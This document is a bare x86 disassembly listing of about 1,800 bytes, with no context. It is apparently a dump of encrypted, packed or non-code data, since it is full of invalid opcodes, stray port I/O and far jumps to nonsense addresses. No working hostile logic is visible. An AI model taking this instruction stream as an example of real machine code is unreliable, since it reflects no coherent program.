  406f54:	iret   
  406f55:	jmp    0x4a3358aa
  406f5a:	retf   0x669c
  406f5d:	call   0x629c:0x2797bd76
  406f64:	cmp    BYTE PTR [eax+0x74],ch
  406f67:	sub    DWORD PTR [ecx],ebp
  406f69:	mov    dh,0x5c
  406f6b:	cwde   
  406f6c:	shl    DWORD PTR [ebp-0x6dd95cf3],cl
  406f72:	and    BYTE PTR [edi],ah
  406f74:	sub    esp,esp
  406f76:	out    0x87,eax
  406f78:	ret    
  406f79:	hlt    
  406f7a:	sbb    BYTE PTR [ecx+0x3a],0xe4
  406f7e:	cmp    DWORD PTR ds:[edx+ebp*1+0x58],0x63
  406f84:	fs pop edi
  406f86:	dec    ebp
  406f87:	fdivrp st(5),st
  406f89:	cmp    esi,esp
  406f8b:	pop    ecx
  406f8c:	inc    ebx
  406f8d:	pop    edi
  406f8e:	(bad)  
  406f8f:	clc    
  406f90:	repnz leave 
  406f92:	add    ecx,DWORD PTR [ebp-0x3a484c91]
  406f98:	aas    
  406f99:	xor    al,BYTE PTR [eax-0x31]
  406f9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f9d:	loopne 0x406fae
  406f9f:	mov    ch,BYTE PTR [ebp+0xb]
  406fa2:	xchg   ebp,eax
  406fa3:	add    al,BYTE PTR [eax+ebx*1-0x706a35d1]
  406faa:	inc    edx
  406fab:	jecxz  0x40701b
  406fad:	dec    ebp
  406fae:	bsr    esp,DWORD PTR [esi+ebp*2-0x7858925]
  406fb6:	retf   0x5704
  406fb9:	add    ch,BYTE PTR [ecx+0x5ae3c0a1]
  406fbf:	cmp    BYTE PTR [edx],al
  406fc1:	push   edx
  406fc2:	adc    bh,BYTE PTR [ebx-0x6fff9936]
  406fc8:	pop    ebx
  406fc9:	mov    esp,0x8ea5d33f
  406fce:	and    bh,ch
  406fd0:	dec    esp
  406fd1:	hlt    
  406fd2:	push   ecx
  406fd3:	cmp    bh,BYTE PTR [eax+0x18]
  406fd6:	aas    
  406fd7:	dec    esp
  406fd8:	jle    0x406f7e
  406fda:	iret   
  406fdb:	pusha  
  406fdc:	pop    esp
  406fdd:	adc    BYTE PTR [edx+ecx*8],al
  406fe0:	outs   dx,BYTE PTR ds:[esi]
  406fe1:	loop   0x407044
  406fe3:	test   al,0xd
  406fe5:	push   esp
  406fe6:	inc    esi
  406fe7:	mov    BYTE PTR [edx+0x24eb6e0d],bh
  406fed:	fisub  DWORD PTR [edi-0x7899bd58]
  406ff3:	cmp    BYTE PTR [ebx],ah
  406ff5:	add    DWORD PTR ds:0xaacde00b,ebp
  406ffb:	cdq    
  406ffc:	sbb    al,0x42
  406ffe:	cmp    eax,0xd8797a07
  407003:	xor    DWORD PTR [ebx+0x39],ebx
  407006:	xchg   edi,ecx
  407008:	leave  
  407009:	mov    esp,0x3be3a74a
  40700e:	add    edx,DWORD PTR [edx-0x2006f64b]
  407014:	xor    ecx,ecx
  407016:	or     BYTE PTR [edi-0x29],bl
  407019:	and    eax,0xec29cf54
  40701e:	xchg   ebx,eax
  40701f:	cmp    bh,ch
  407021:	in     eax,dx
  407022:	dec    ebp
  407023:	jmp    0x407040
  407025:	aas    
  407026:	popa   
  407027:	mov    esi,0xd2cc4207
  40702c:	mov    WORD PTR [eax*8+0x502e8a5b],?
  407033:	xor    dl,BYTE PTR [esp+edi*8-0x40]
  407037:	ins    BYTE PTR es:[edi],dx
  407038:	fdiv   st,st(0)
  40703a:	outs   dx,BYTE PTR ds:[esi]
  40703b:	jnp    0x4070af
  40703d:	ja     0x407093
  40703f:	and    al,0xba
  407041:	sbb    edx,ebx
  407043:	icebp  
  407044:	xchg   edi,eax
  407045:	or     eax,0x7a521c73
  40704a:	icebp  
  40704b:	or     dl,al
  40704d:	push   es
  40704e:	sbb    cl,ch
  407050:	fnsave [eax-0x2f46f051]
  407056:	push   edi
  407057:	stc    
  407058:	mov    dl,0x2
  40705a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40705b:	add    eax,0xfc36d11c
  407060:	int    0xb9
  407062:	push   edx
  407063:	fisubr DWORD PTR [ecx+edi*4]
  407066:	push   ss
  407067:	test   DWORD PTR [edx+0x1],0xe9833ad8
  40706e:	pop    edi
  40706f:	out    0x24,al
  407071:	mov    cl,0xcb
  407073:	adc    eax,0xe7ca8e80
  407078:	dec    esi
  407079:	add    eax,0xb06aebbd
  40707e:	inc    esi
  40707f:	jns    0x4070dd
  407081:	fcom   DWORD PTR [edi+0x1d8c95f5]
  407087:	icebp  
  407088:	int3   
  407089:	leave  
  40708a:	sub    eax,0x270ab06
  40708f:	xor    DWORD PTR [eax+0x5d],ebp
  407092:	dec    edx
  407093:	inc    ecx
  407094:	fist   WORD PTR [edi+0x36]
  407097:	dec    ebp
  407098:	dec    edx
  407099:	ja     0x407063
  40709b:	fs xor ebx,eax
  40709e:	cmp    ch,bl
  4070a0:	mov    al,0x83
  4070a2:	(bad)  
  4070a3:	les    edi,FWORD PTR [ecx-0x5b]
  4070a6:	jne    0x40711e
  4070a8:	or     eax,0xa33e5b16
  4070ad:	ret    0xf9e8
  4070b0:	cdq    
  4070b1:	inc    ebp
  4070b2:	(bad)  
  4070b3:	cmp    al,0x72
  4070b5:	jmp    0x4070eb
  4070b7:	ret    0x2a4b
  4070ba:	fiadd  DWORD PTR [eax+0x50da040]
  4070c0:	outs   dx,BYTE PTR ds:[esi]
  4070c1:	xor    cl,BYTE PTR [ebx-0x5160d14e]
  4070c7:	dec    eax
  4070c8:	jbe    0x407110
  4070ca:	cwde   
  4070cb:	into   
  4070cc:	pop    esi
  4070cd:	das    
  4070ce:	dec    esi
  4070cf:	imul   edi,DWORD PTR [esi+0x13],0x71828cc6
  4070d6:	pop    eax
  4070d7:	mov    edi,0xecbab35
  4070dc:	call   0x9d37:0x6d571fdb
  4070e3:	fs (bad) 
  4070e5:	jg     0x4070ea
  4070e7:	js     0x407143
  4070e9:	cld    
  4070ea:	rcl    DWORD PTR [ebp-0x6ab86d37],cl
  4070f0:	xchg   edx,eax
  4070f1:	out    0x0,al
  4070f3:	mov    ebx,0xdc8bba1
  4070f8:	jl     0x4070ef
  4070fa:	xor    dl,al
  4070fc:	mov    esp,0x192b71f5
  407101:	retf   
  407102:	not    DWORD PTR ds:0x5162da9f
  407108:	push   edi
  407109:	pminub mm6,mm7
  40710c:	and    BYTE PTR [ebx+0x7d],cl
  40710f:	popaw  
  407111:	or     DWORD PTR [esi],esi
  407113:	stos   BYTE PTR es:[edi],al
  407114:	js     0x407125
  407116:	xchg   esi,eax
  407117:	mov    ebp,0x2617a850
  40711c:	setle  BYTE PTR [esi]
  40711f:	sub    eax,DWORD PTR [ebx-0x67a59457]
  407125:	loope  0x407198
  407127:	fs jmp 0xf090cedd
  40712d:	mov    dh,0x35
  40712f:	sub    BYTE PTR [edi+0x2ea9f18b],cl
  407135:	(bad)  
  407137:	jo     0x407149
  407139:	ins    DWORD PTR es:[edi],dx
  40713a:	xor    ebx,0x4cd651ac
  407140:	xchg   DWORD PTR [esi+0x11d33391],esi
  407146:	dec    ebx
  407147:	repz add BYTE PTR [ebx],ah
  40714a:	retf   0xc55f
  40714d:	aam    0x50
  40714f:	jmp    0x4070e5
  407151:	imul   esp,DWORD PTR [ebp+0x61941464],0x5b
  407158:	nop
  407159:	test   DWORD PTR [ecx],0xb9385c47
  40715f:	retf   
  407160:	mul    ebp
  407162:	xchg   esi,eax
  407163:	mov    cl,0x8e
  407165:	cs call 0x7843:0xab2e2f4d
  40716d:	out    0x12,al
  40716f:	jg     0x407121
  407171:	cdq    
  407172:	add    BYTE PTR [ebx+0x4a80111c],dl
  407178:	mov    cs,WORD PTR [ebx-0x56]
  40717b:	jmp    0x407148
  40717d:	dec    esp
  40717e:	mov    ah,BYTE PTR [ecx]
  407180:	adc    ah,dh
  407182:	push   ebx
  407183:	sar    edi,cl
  407185:	test   al,0xe
  407187:	test   ecx,edx
  407189:	mov    edx,0xd6a81632
  40718e:	adc    al,ah
  407190:	bound  edi,QWORD PTR [ebx+0x54]
  407193:	dec    eax
  407194:	in     al,0xd8
  407196:	aam    0x4b
  407198:	lahf   
  407199:	in     eax,0x74
  40719b:	mov    dh,0xdf
  40719d:	test   DWORD PTR [ebx-0x19],0xae754cfe
  4071a4:	pop    es
  4071a5:	(bad)  
  4071a6:	rol    bh,1
  4071a8:	mov    esi,esi
  4071aa:	stos   BYTE PTR es:[edi],al
  4071ab:	xor    BYTE PTR ds:0xb8ad66d0,dl
  4071b1:	nop
  4071b2:	ret    
  4071b3:	cwde   
  4071b4:	jp     0x407142
  4071b6:	xor    ch,BYTE PTR [edx]
  4071b8:	lods   eax,DWORD PTR ds:[esi]
  4071b9:	ret    
  4071ba:	ror    DWORD PTR [ebx],0x1
  4071bd:	xchg   edx,eax
  4071be:	jle    0x4071f7
  4071c0:	and    DWORD PTR [edx-0x36449994],edi
  4071c6:	add    ecx,ecx
  4071c8:	out    0x15,eax
  4071ca:	mov    dh,0xdd
  4071cc:	push   edi
  4071cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071ce:	pop    ss
  4071cf:	inc    ecx
  4071d0:	xor    esp,ebp
  4071d2:	enter  0x93e4,0xee
  4071d6:	add    edx,ebx
  4071d8:	pop    edi
  4071d9:	(bad)  
  4071da:	cmp    eax,0xda39b68b
  4071df:	addr16 js 0x4071a5
  4071e2:	rol    ecx,0x81
  4071e5:	xchg   edx,eax
  4071e6:	mov    bl,0xda
  4071e8:	mov    al,ds:0xd4499fb
  4071ed:	sub    eax,0x356cb317
  4071f2:	push   ss
  4071f3:	call   0x425dc51
  4071f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071f9:	adc    al,0x33
  4071fb:	lods   eax,DWORD PTR ds:[esi]
  4071fc:	shl    ebp,cl
  4071fe:	cmp    ebp,edi
  407200:	cld    
  407201:	hlt    
  407202:	scas   al,BYTE PTR es:[edi]
  407203:	ret    0x39dd
  407206:	jmp    0x656d:0x4cf407bb
  40720d:	adc    DWORD PTR [esi-0x15],0xffffffd9
  407211:	clc    
  407212:	aaa    
  407213:	jo     0x40723c
  407215:	and    al,0xc7
  407217:	imul   ebx,DWORD PTR [edi-0x31d1f2a1],0x3f
  40721e:	call   0x1e24:0x627eb6f9
  407225:	inc    ecx
  407226:	and    eax,0xcb685aa7
  40722b:	add    eax,0x858257e0
  407230:	fcmovu st,st(0)
  407232:	cmp    edx,ebp
  407234:	ficomp DWORD PTR [ecx-0x7]
  407237:	inc    edi
  407238:	clc    
  407239:	gs lock clc 
  40723c:	repz jp 0x407299
  40723f:	mov    dl,BYTE PTR [ebx+0x7d14877f]
  407245:	rol    DWORD PTR ds:0x764a0c97,1
  40724b:	lds    eax,FWORD PTR [ebp-0x359d51a3]
  407251:	or     al,0xb7
  407253:	lahf   
  407254:	add    DWORD PTR [eax+0x6c],ebp
  407257:	rcl    BYTE PTR [edi],0xb0
  40725a:	daa    
  40725b:	mov    ebp,0x83f22abf
  407260:	mov    dl,0xc8
  407262:	sbb    DWORD PTR es:[edi-0x24],edx
  407266:	ja     0x4072d6
  407268:	xor    al,0xec
  40726a:	pop    ds
  40726b:	push   ebp
  40726c:	mov    dl,0xbf
  40726e:	or     BYTE PTR [eax],ah
  407270:	(bad)  
  407271:	ss in  eax,0xd6
  407274:	dec    eax
  407275:	retf   0x9ac0
  407278:	addr16 in eax,dx
  40727a:	jmp    0xfecf2f58
  40727f:	dec    ebx
  407280:	mov    DWORD PTR [ecx-0x7],ebp
  407283:	nop
  407284:	dec    esp
  407285:	jae    0x407261
  407287:	adc    ch,BYTE PTR [esi+0x26]
  40728a:	and    edx,DWORD PTR [ebx]
  40728c:	loope  0x40724d
  40728e:	rol    BYTE PTR [edx+0x3d3e9233],cl
  407294:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407295:	inc    edi
  407296:	mov    ss:0xec366f5e,al
  40729c:	or     al,0x87
  40729e:	in     eax,0x64
  4072a0:	iret   
  4072a1:	neg    BYTE PTR [ebx+0x79]
  4072a4:	jbe    0x4072ab
  4072a6:	lock (bad) 
  4072a8:	mov    ah,0x9e
  4072aa:	push   edx
  4072ab:	adc    DWORD PTR [eax],edi
  4072ad:	xchg   edx,eax
  4072ae:	pop    esi
  4072af:	sbb    eax,0xb610f336
  4072b4:	aas    
  4072b5:	add    al,0xdd
  4072b7:	fwait
  4072b8:	and    edx,DWORD PTR [edx-0x45bfee72]
  4072be:	(bad)  
  4072bf:	not    BYTE PTR [edx-0x5a]
  4072c2:	push   edi
  4072c3:	(bad)  
  4072c4:	pop    edi
  4072c5:	das    
  4072c6:	sbb    ebp,DWORD PTR [eax+0x4b]
  4072c9:	mov    bl,0x85
  4072cb:	dec    edi
  4072cc:	fidiv  WORD PTR [edi+0xa54f774]
  4072d2:	test   dh,ah
  4072d4:	push   0x18
  4072d6:	inc    esi
  4072d7:	xchg   esp,eax
  4072d8:	pop    edx
  4072d9:	push   DWORD PTR [ebx]
  4072db:	fmul   DWORD PTR [ebx+esi*4+0x505dfc2a]
  4072e2:	xchg   esp,eax
  4072e3:	aas    
  4072e4:	push   esi
  4072e5:	jb     0x407283
  4072e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072e8:	xor    eax,0x4bfb2559
  4072ed:	inc    edi
  4072ee:	pop    es
  4072ef:	sbb    eax,0xc179241b
  4072f4:	out    dx,al
  4072f5:	outs   dx,DWORD PTR ds:[esi]
  4072f6:	outs   dx,BYTE PTR ds:[esi]
  4072f7:	mov    esp,0xbbdc95c9
  4072fc:	sub    BYTE PTR [edi+eax*2-0x20],bh
  407300:	mov    WORD PTR [edx],?
  407302:	in     al,dx
  407303:	scas   al,BYTE PTR es:[edi]
  407304:	xchg   esp,eax
  407305:	jb     0x407304
  407307:	mov    ds:0xd0b22ee1,al
  40730c:	lahf   
  40730d:	jae    0x4072cd
  40730f:	leave  
  407310:	pop    ss
  407311:	loopne 0x4072e6
  407313:	or     eax,0x25a2e2da
  407318:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407319:	adc    ch,ch
  40731b:	bnd jg 0x407372
  40731e:	pop    ebx
  40731f:	sar    BYTE PTR [ecx+ebx*2],0xb5
  407323:	fsubr  DWORD PTR [ebp+0x2]
  407326:	push   es
  407327:	int    0x38
  407329:	lea    edi,[edi]
  40732b:	jbe    0x407303
  40732d:	clc    
  40732e:	xchg   cl,ch
  407330:	in     eax,dx
  407331:	rcr    BYTE PTR [ebx-0x65d08827],cl
  407337:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407338:	sub    eax,0xe533c5fc
  40733d:	pop    ds
  40733e:	jo     0x40736f
  407340:	xor    edi,DWORD PTR [ebx]
  407342:	jge    0x4073a8
  407344:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407345:	or     DWORD PTR [ebx],ebp
  407347:	aaa    
  407348:	mov    dh,BYTE PTR [edi+0x7c]
  40734b:	pushf  
  40734c:	jg     0x407305
  40734e:	push   esp
  40734f:	sbb    ebp,DWORD PTR [edi-0x7515e94c]
  407355:	cwde   
  407356:	jmp    0xf366490
  40735b:	mov    esi,0x7b79f4b3
  407360:	mov    bh,0x21
  407362:	push   ds
  407363:	hlt    
  407364:	in     eax,0xaf
  407366:	ja     0x40731b
  407368:	iret   
  407369:	ss fs cli 
  40736c:	int    0x6f
  40736e:	not    BYTE PTR [esi]
  407370:	ret    0xa88f
  407373:	mov    bl,0xb2
  407375:	jmp    0x96aa:0xd3b6e048
  40737c:	mov    edi,0xb4f5b69
  407381:	in     al,dx
  407382:	repnz push eax
  407384:	mov    ah,0xde
  407386:	add    BYTE PTR ds:0x4629e4bd,ah
  40738c:	cmp    ch,BYTE PTR [eax+edx*2-0x5baaf6ca]
  407393:	dec    esp
  407394:	retf   
  407395:	mov    ebx,0x95392e6e
  40739a:	pop    esi
  40739b:	xlat   BYTE PTR ds:[ebx]
  40739c:	xchg   BYTE PTR [eax],ch
  40739e:	ja     0x40736b
  4073a0:	adc    BYTE PTR [eax+0x74],ch
  4073a3:	xchg   dh,dl
  4073a5:	xor    al,0x2d
  4073a7:	cs out 0x3c,eax
  4073aa:	leave  
  4073ab:	dec    eax
  4073ac:	mov    ds:0x41938807,eax
  4073b1:	imul   esp,DWORD PTR [ecx],0xf921446f
  4073b7:	mov    edx,0xdc08ea38
  4073bc:	lahf   
  4073bd:	jmp    0x53e84fe0
  4073c2:	xor    eax,0xbd59c94c
  4073c7:	scas   eax,DWORD PTR es:[edi]
  4073c8:	push   ds
  4073c9:	adc    dh,0x12
  4073cc:	cld    
  4073cd:	cmp    ch,dl
  4073cf:	pop    edi
  4073d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073d1:	xchg   ecx,eax
  4073d2:	and    BYTE PTR [esi-0x53d08840],0x39
  4073d9:	fwait
  4073da:	ins    BYTE PTR es:[edi],dx
  4073db:	mov    BYTE PTR [esi+0x71],bl
  4073de:	lds    esi,FWORD PTR [ebp-0x41]
  4073e1:	fsub   QWORD PTR [eax+0x8742575]
  4073e7:	enterw 0xd5d8,0xf1
  4073ec:	cmp    eax,0xac9b9f3b
  4073f1:	int    0x37
  4073f3:	stos   DWORD PTR es:[edi],eax
  4073f4:	sub    DWORD PTR [eax+0x7b],0xb17b5f34
  4073fb:	popf   
  4073fc:	add    eax,0x475755b4
  407401:	outs   dx,BYTE PTR ds:[esi]
  407402:	and    al,0xdc
  407404:	mov    es:0x14820053,al
  40740a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40740b:	mov    BYTE PTR [ecx+0x15a15af7],dl
  407411:	xchg   esi,eax
  407412:	jmp    0x2bef:0x377abb00
  407419:	mov    cl,BYTE PTR [ebx]
  40741b:	mov    eax,ds:0x536cee3e
  407420:	dec    eax
  407421:	dec    edi
  407422:	bnd jg 0x4073fe
  407425:	push   ebp
  407426:	cmp    ebx,DWORD PTR [eax+ebx*8-0x5b]
  40742a:	(bad)  
  40742c:	imul   esi,ecx,0x8aef4280
  407432:	xchg   ebx,eax
  407433:	mov    ds:0x91d11a4d,al
  407438:	mov    cl,0xb2
  40743a:	cmp    esi,edx
  40743c:	sub    eax,0x49f5b3d3
  407441:	pop    edx
  407442:	test   BYTE PTR [edx],ah
  407444:	xor    DWORD PTR [edx],eax
  407446:	data16 mov cl,0x68
  407449:	mov    edi,0x36dc72d0
  40744e:	sbb    dl,BYTE PTR [ecx]
  407450:	push   eax
  407451:	push   es
  407452:	push   ebp
  407453:	bound  eax,QWORD PTR [ecx+0xb72098d]
  407459:	adc    edx,edx
  40745b:	daa    
  40745c:	xchg   BYTE PTR [ecx+0x64],cl
  40745f:	adc    eax,DWORD PTR [eax-0x79aab6da]
  407465:	test   al,0x18
  407467:	outs   dx,BYTE PTR ds:[esi]
  407468:	fdiv   st(7),st
  40746a:	push   ebx
  40746b:	jb     0x4074e8
  40746d:	adc    eax,0x54dc1edb
  407472:	mov    dh,BYTE PTR ds:0x13e3a428
  407478:	enter  0xd630,0x8d
  40747c:	jp     0x40740e
  40747e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40747f:	xor    ecx,ebx
  407481:	mov    ds:0x1f433550,eax
  407486:	lods   eax,DWORD PTR ds:[esi]
  407487:	xor    al,dl
  407489:	dec    edi
  40748a:	dec    ecx
  40748b:	xor    esi,DWORD PTR [ecx]
  40748d:	pop    ecx
  40748e:	popa   
  40748f:	lock popa 
  407491:	cmc    
  407492:	pop    edi
  407493:	adc    DWORD PTR [ebp-0x16],edx
  407496:	push   ds
  407497:	arpl   WORD PTR [edx],bp
  407499:	outs   dx,BYTE PTR ds:[esi]
  40749a:	pop    ds
  40749b:	(bad)  [esi-0x89639f9]
  4074a1:	in     al,dx
  4074a2:	add    BYTE PTR [edx-0x5efd5c92],ch
  4074a8:	ror    DWORD PTR [esi+0x1cf9e018],1
  4074ae:	sbb    DWORD PTR [eax+0x5b],ecx
  4074b1:	mov    al,ds:0xac283fcc
  4074b6:	dec    ebx
  4074b7:	push   edx
  4074b8:	and    DWORD PTR [ebx],edi
  4074ba:	mov    ah,0x59
  4074bc:	clc    
  4074bd:	dec    edx
  4074be:	xor    ebp,ecx
  4074c0:	sbb    al,bh
  4074c2:	jmp    0x97a79cfe
  4074c7:	or     DWORD PTR [ebp-0x3],ebp
  4074ca:	gs xchg ebx,eax
  4074cc:	les    ebp,FWORD PTR [edx-0x2]
  4074cf:	outs   dx,BYTE PTR ds:[esi]
  4074d0:	ror    DWORD PTR [eax],1
  4074d2:	push   ebp
  4074d3:	aam    0x81
  4074d5:	cmp    eax,ecx
  4074d7:	in     al,dx
  4074d8:	dec    BYTE PTR cs:[eax+0x66]
  4074dc:	shl    DWORD PTR [edx],cl
  4074de:	iret   
  4074df:	mov    ebx,DWORD PTR [ebp+0x5]
  4074e2:	stc    
  4074e3:	pop    ebp
  4074e4:	or     al,BYTE PTR [esi+0x56b8dd7f]
  4074ea:	and    ebp,0x31930d28
  4074f0:	in     eax,0x54
  4074f2:	in     al,0x64
  4074f4:	pop    esp
  4074f6:	dec    edx
  4074f7:	inc    BYTE PTR [ebx+eiz*4+0x5574c8fd]
  4074fe:	push   ds
  4074ff:	neg    BYTE PTR [ebp-0xe430abc]
  407505:	aam    0x70
  407507:	loope  0x407515
  407509:	fldcw  WORD PTR [edi]
  40750b:	int    0x12
  40750d:	cmc    
  40750e:	sbb    eax,0x59270be
  407513:	shl    DWORD PTR [esi-0x602c4894],cl
  407519:	pop    esi
  40751a:	ss cwde 
  40751c:	shr    DWORD PTR [esi],cl
  40751e:	jl     0x4074db
  407520:	lahf   
  407521:	inc    eax
  407522:	fimul  WORD PTR [edi+0xb5bd04]
  407528:	sub    BYTE PTR [edx+0x7abc19fa],bh
  40752e:	retf   
  40752f:	pusha  
  407530:	or     BYTE PTR [edi+0x62],0x99
  407534:	xchg   DWORD PTR [ecx+0x5ad9d286],edi
  40753a:	cs add eax,0xaae7fa96
  407540:	or     al,BYTE PTR [ecx+0x6c1d5601]
  407546:	ins    DWORD PTR es:[edi],dx
  407547:	cmp    al,0x48
  407549:	xchg   edx,eax
  40754a:	pop    esp
  40754b:	mov    al,0x33
  40754d:	pop    ss
  40754e:	fidivr DWORD PTR [ecx]
  407550:	or     al,0xb1
  407552:	stos   DWORD PTR es:[edi],eax
  407553:	push   ecx
  407554:	fmul   QWORD PTR [edi+eiz*8-0x3cfce12b]
  40755b:	push   ebp
  40755c:	and    eax,0xcf522196
  407561:	daa    
  407562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407563:	aad    0x82
  407565:	mov    cl,0xec
  407567:	test   edi,ebx
  407569:	sbb    edx,DWORD PTR [ebp-0x13bcebbe]
  40756f:	aad    0x52
  407571:	or     DWORD PTR [ecx-0x8],esp
  407574:	pop    eax
  407575:	xor    DWORD PTR [ecx],0xffffffce
  407578:	mov    ecx,0x1baf6b84
  40757d:	xchg   ebx,eax
  40757e:	ins    BYTE PTR es:[edi],dx
  40757f:	inc    eax
  407580:	retf   
  407581:	rcr    BYTE PTR [ecx+0xb910b0c],cl
  407587:	cli    
  407588:	dec    ebp
  407589:	adc    DWORD PTR [esp+ecx*1+0x3f],0x44
  40758e:	xchg   esp,eax
  40758f:	xlat   BYTE PTR ds:[ebx]
  407590:	fstp   QWORD PTR [esi-0xfacf2f4]
  407596:	sti    
  407597:	mov    BYTE PTR [edi],0xa
  40759a:	std    
  40759b:	repz (bad) 
  40759d:	jo     0x4075c3
  40759f:	mov    edi,0xc841b26f
  4075a4:	xor    eax,0xbe2a708d
  4075a9:	leave  
  4075aa:	fadd   DWORD PTR [edi-0x1c]
  4075ad:	loop   0x407536
  4075af:	in     al,dx
  4075b0:	dec    esi
  4075b1:	fild   DWORD PTR [ebx]
  4075b3:	sub    eax,0x47cf93de
  4075b8:	cwde   
  4075b9:	jge    0x40755c
  4075bb:	jl     0x40763c
  4075bd:	and    ebx,DWORD PTR [ebx+0x17222232]
  4075c3:	jecxz  0x40761e
  4075c5:	xor    BYTE PTR [eax],0x32
  4075c8:	xor    eax,0x2cb38034
  4075cd:	add    al,0x8
  4075cf:	mov    BYTE PTR [ebp+0x3c],cl
  4075d2:	aas    
  4075d3:	rcr    ebp,1
  4075d5:	add    eax,0x5f8ff6da
  4075da:	inc    ecx
  4075db:	push   edx
  4075dc:	pop    DWORD PTR [ecx-0x141b2ed2]
  4075e2:	sbb    eax,0xc3e07693
  4075e7:	jecxz  0x40760b
  4075e9:	mov    BYTE PTR [ecx-0x70],bh
  4075ec:	jne    0x407658
  4075ee:	shl    BYTE PTR [edx-0x78],0x59
  4075f2:	pop    esi
  4075f3:	push   cs
  4075f4:	retf   
  4075f5:	int3   
  4075f6:	sahf   
  4075f7:	aam    0x23
  4075f9:	retf   
  4075fa:	pop    ds
  4075fb:	(bad)  
  4075fd:	test   BYTE PTR [edi],al
  4075ff:	mov    ebp,es
  407601:	push   cs
  407602:	pop    ebx
  407603:	scas   al,BYTE PTR es:[edi]
  407604:	mov    al,0x39
  407606:	sbb    DWORD PTR [esi+ecx*2],esp
  407609:	(bad)  
  40760a:	aas    
  40760b:	js     0x4075e6
  40760d:	outs   dx,DWORD PTR es:[esi]
  40760f:	add    al,0xd8
  407611:	sub    DWORD PTR [ebx+0x3d8c00bc],0x8aa4d9d1
  40761b:	push   ds
  40761c:	cld    
  40761d:	test   eax,0xa45d1222
  407622:	sbb    eax,0x707f2930
  407627:	cwde   
  407628:	sar    ebp,cl
  40762a:	ficomp WORD PTR [esi+0x36]
  40762d:	jg     0x407616
  40762f:	fwait
  407630:	lods   al,BYTE PTR ds:[esi]
  407631:	sub    BYTE PTR [ebx],ah
  407633:	xchg   edi,eax
  407634:	fdivp  st(4),st
  407636:	adc    dh,BYTE PTR [eax]
  407638:	out    0x85,al
  40763a:	sub    al,0x53
  40763c:	add    DWORD PTR [ebx],esi
  40763e:	push   0xffffffd9
  407640:	call   0x44f9:0x730c
  407646:	fcom   QWORD PTR [eax]
  407648:	sub    al,0x18
  40764a:	inc    ebp
  40764b:	les    edx,FWORD PTR [edi-0x6c]
  40764e:	dec    esp
  40764f:	lea    esp,[ebx-0x4bd790f8]
  407655:	sub    BYTE PTR [ebp-0x792d1459],dh
  40765b:	mov    DWORD PTR [eax-0x1c],edi
  40765e:	jo     0x407654
  407660:	fild   DWORD PTR [ebp+0x7b]
  407663:	cmp    ebx,DWORD PTR [edx+0x5b373fcd]
  407669:	jns    0x40763f
  40766b:	jne    0x4076d4
  40766d:	jae    0x407650
  40766f:	inc    ebp
  407670:	push   edi
  407671:	sbb    esp,DWORD PTR [ebx-0x78]
  407674:	push   0x1e6231c5
  407679:	loopne 0x4076c7
  40767b:	cmp    BYTE PTR [eax],ah
  40767d:	xchg   esp,eax
  40767e:	adc    eax,0xde7ad17f
  407683:	mov    bh,0xa0
  407685:	(bad)  
  407686:	mov    edx,0xbdeb406a
  40768b:	pop    esp
  40768c:	popf   
  40768d:	rcl    DWORD PTR [ebx],cl
  40768f:	xchg   esp,eax
  407690:	or     BYTE PTR [ecx+esi*2-0xa],ch
  407694:	int    0xf3
  407696:	vandnps xmm5,xmm2,XMMWORD PTR [edi+0x2a]
  40769b:	pmaxub mm7,QWORD PTR [eax-0xbd6b32a]
  4076a2:	pop    ecx
  4076a3:	sub    bl,dl
  4076a5:	fiadd  DWORD PTR ds:0x9c4fc1d
  4076ab:	mov    ch,0xd9
  4076ad:	cmc    
  4076ae:	push   esp
  4076af:	fisttp WORD PTR [edx+ebx*4+0x32ced079]
  4076b6:	sbb    ecx,DWORD PTR [eax+eiz*1]
  4076b9:	mov    gs,WORD PTR [eax]
  4076bb:	xchg   esi,eax
  4076bc:	sub    ebx,DWORD PTR [eax]
  4076be:	lods   al,BYTE PTR ds:[esi]
  4076bf:	xchg   ecx,eax
  4076c0:	cmp    DWORD PTR [eax-0x2a3cc1bb],edx
  4076c6:	or     al,bh
  4076c8:	and    ecx,DWORD PTR [edx-0xe]
  4076cb:	data16 das 
  4076cd:	xor    al,0x75
  4076cf:	sub    bl,dh
  4076d1:	fdiv   QWORD PTR [eax-0x45ad51e1]
  4076d7:	or     dh,BYTE PTR [ebp-0x580dcdcf]
  4076dd:	gs aam 0x61
  4076e0:	sub    bh,BYTE PTR [edi+0x5fde9eb7]
  4076e6:	dec    ebp
  4076e7:	adc    esp,esp
  4076e9:	nop
  4076ea:	fwait
  4076eb:	loope  0x40771d
  4076ed:	jecxz  0x407686
  4076ef:	jle    0x407725
  4076f1:	stos   DWORD PTR es:[edi],eax
  4076f2:	mov    ecx,0xa589225a
  4076f7:	mov    bh,0xc9
  4076f9:	and    dl,BYTE PTR [edx-0x2bc1cb3e]
  4076ff:	and    eax,0xbb35c5e0
  407704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407705:	stos   DWORD PTR es:[edi],eax
  407706:	popa   
  407707:	and    edx,DWORD PTR gs:0xacf3da55
  40770e:	fbstp  TBYTE PTR [ebx+0x6e]
  407711:	ret    0x54c0
  407714:	fnstsw WORD PTR [eax-0xb]
  407717:	xchg   ebx,eax
  407718:	or     al,dh
  40771a:	iret   
  40771b:	pop    eax
  40771c:	cmp    esp,eax
  40771e:	loopne 0x40777a
  407720:	rcr    BYTE PTR [edx+0x452eb9ff],0xb6
  407727:	jecxz  0x407762
  407729:	das    
  40772a:	pop    edi
  40772b:	sub    al,0x29
  40772d:	mov    bh,BYTE PTR [edx-0x1b]
  407730:	into   
  407731:	and    al,0x62
  407733:	push   eax
  407734:	pop    edi
  407735:	and    BYTE PTR [edi+0x431d494a],dl
  40773b:	xchg   esp,eax
  40773c:	pop    edx
